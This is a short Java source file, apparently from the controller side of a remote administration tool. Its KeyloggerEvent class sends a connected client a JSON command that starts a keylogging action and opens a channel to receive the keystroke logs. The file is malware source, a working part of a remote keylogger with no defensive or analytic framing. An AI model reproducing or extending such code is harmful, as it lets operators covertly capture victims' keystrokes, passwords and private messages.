package TableUtils.KeyLogger.Events;

import Server.BytesChannel;
import Information.Category;
import Server.Client;
import TableUtils.KeyLogger.Constants.KeyLog;
import org.json.JSONObject;

import java.io.IOException;

public class KeyloggerEvent implements Runnable {

    private final Client client;
    private final KeyLog keyLog;

    public KeyloggerEvent(Client client, KeyLog keyLog) {
        this.client = client;
        this.keyLog = keyLog;
    }

    @Override
    public void run() {
        BytesChannel bytesChannel = client.createFileChannel(Category.KEYLOGGER_LOGS);
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ACTION", keyLog.toString());
        jsonObject.put("channel_id", bytesChannel.getId());
        try {
            client.sendString(jsonObject.toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
